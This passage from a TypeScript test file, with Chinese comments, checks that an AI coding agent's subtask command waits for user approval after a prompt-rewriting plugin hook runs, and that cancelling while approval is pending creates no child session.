        Ripgrep.node,
        Format.node,
        Truncate.node,
        SessionProcessorSvc.node,
        Image.node,
        SessionCompaction.node,
        SessionRevert.node,
        Instruction.node,
        SystemPrompt.node,
        CrossSpawnSpawner.node,
        RuntimeFlags.node,
      ]),
      LayerNode.make({ service: TestLLMServer, layer: TestLLMServer.layer, deps: [] }),
    ]),
    [
      [SessionSummary.node, summary],
      [LSP.node, lsp],
      [MCP.node, noMcp],
      [Plugin.node, hookPlugin],
      [RuntimeFlags.node, RuntimeFlags.layer({ experimentalEventSystem: true })],
      [AlphaToolPolicy.node, AlphaToolPolicy.layer({ account: Effect.sync(() => policyAccount) })],
    ],
  ),
)

const COMMAND_SUBTASK = "delegate-sub"
const promptConfig = (url: string) =>
  ({
    provider: {
      test: {
        name: "Test",
        id: "test",
        env: [],
        npm: "@ai-sdk/openai-compatible",
        models: {
          "test-model": {
            id: "test-model",
            name: "Test Model",
            attachment: false,
            reasoning: false,
            temperature: false,
            tool_call: true,
            release_date: "2025-01-01",
            limit: { context: 100000, output: 10000 },
            cost: { input: 0, output: 0 },
            options: {},
          },
        },
        options: { apiKey: "test-key", baseURL: url },
      },
    },
    command: {
      [COMMAND_SUBTASK]: {
        template: "inspect the cache key path",
        agent: "general",
        subtask: true,
        description: "inspect",
      },
    },
  }) satisfies Partial<ConfigV1.Info> as Partial<ConfigV1.Info>

/** 设置里 task 为询问,发 subtask 命令,等到那一问挂进待批队列。 */
const subtaskPending = Effect.fn("alpha1574.subtaskPending")(function* () {
  policyAccount = `t-${Math.random().toString(36).slice(2)}`
  taskHooks = 0
  const { directory } = yield* TestInstance
  const llm = yield* TestLLMServer
  yield* (yield* FSUtil.Service).writeWithDirs(
    path.join(directory, "opencode.json"),
    JSON.stringify({ $schema: "https://opencode.ai/config.json", ...promptConfig(llm.url) }),
  )
  yield* (yield* Config.Service).get()
  yield* (yield* AlphaToolPolicy.Service).setRecord({ selector: { level: "tool", canonical: ID_TASK }, state: "ask" })
  const sessions = yield* Session.Service
  const permission = yield* Permission.Service
  const prompt = yield* SessionPrompt.Service
  const chat = yield* sessions.create({ title: "REQ-236 C2 direct subtask" })
  const fiber = yield* prompt
    .command({ sessionID: chat.id, command: COMMAND_SUBTASK, arguments: "" })
    .pipe(Effect.exit, Effect.forkChild)
  const pending = yield* pollWithTimeout(
    permission.list().pipe(Effect.map((list) => (list.length > 0 ? list : undefined))),
    "直接子任务没有进入待批队列 —— 它没有在问",
    "10 seconds",
  )
  return { sessions, permission, prompt, chat, fiber, pending }
})

describe("#1574 AC2:直接子任务的身份轴询问在钩子之后,问的就是交给子任务的那一份", () => {
  itPrompt.instance(
    "subtask 命令:设置里 task 为询问 ⇒ 钩子先改 prompt,那一问带改后的 args,批准后子会话收到的就是改后的 prompt",
    () =>
      Effect.gen(function* () {
        const { sessions, permission, chat, fiber, pending } = yield* subtaskPending()
        expect(pending).toHaveLength(1)
        expect(pending[0]!.permission).toBe(ID_TASK)
        expect(taskHooks).toBe(1) // 钩子已经跑过,问在它之后
        expect(pending[0]!.metadata["args"]).toMatchObject({ prompt: HOOKED, subagent_type: "general" })
        expect(pending[0]!.metadata["policy"]).toMatchObject({ canonical: ID_TASK, askedBy: "policy" })
        expect(yield* sessions.children(chat.id)).toEqual([])
        yield* permission.reply({ requestID: pending[0]!.id, reply: "once" })
        yield* Fiber.join(fiber)
        const children = yield* sessions.children(chat.id)
        expect(children).toHaveLength(1)
        const childText = (yield* MessageV2.filterCompactedEffect(children[0]!.id))
          .filter((entry) => entry.info.role === "user")
          .flatMap((entry) => entry.parts)
          .flatMap((part) => (part.type === "text" ? [part.text] : []))
        expect(childText).toContain(HOOKED)
        expect(taskHooks).toBe(1)
        expect(yield* permission.list()).toEqual([])
      }),
    30_000,
  )

  itPrompt.instance(
    "询问挂起时用户停止 ⇒ 那条 task part 收口成 Cancelled,不留报错的助手消息,零子会话",
    () =>
      Effect.gen(function* () {
        const { sessions, permission, prompt, chat, fiber } = yield* subtaskPending()
        yield* prompt.cancel(chat.id)
        yield* Fiber.join(fiber)
        const history = yield* MessageV2.filterCompactedEffect(chat.id)
        const assistants = history.filter((entry) => entry.info.role === "assistant")
        const task = assistants
          .flatMap((entry) => entry.parts)
          .find((part): part is SessionV1.ToolPart => part.type === "tool" && part.tool === "task")
        expect(task?.state).toMatchObject({ status: "error", error: "Cancelled" })
        expect(
          assistants.flatMap((entry) =>
            entry.info.role === "assistant" && entry.info.error ? [entry.info.error] : [],
          ),
        ).toEqual([])
        expect(yield* sessions.children(chat.id)).toEqual([])
        expect(yield* permission.list()).toEqual([])
      }),
    30_000,
  )
})
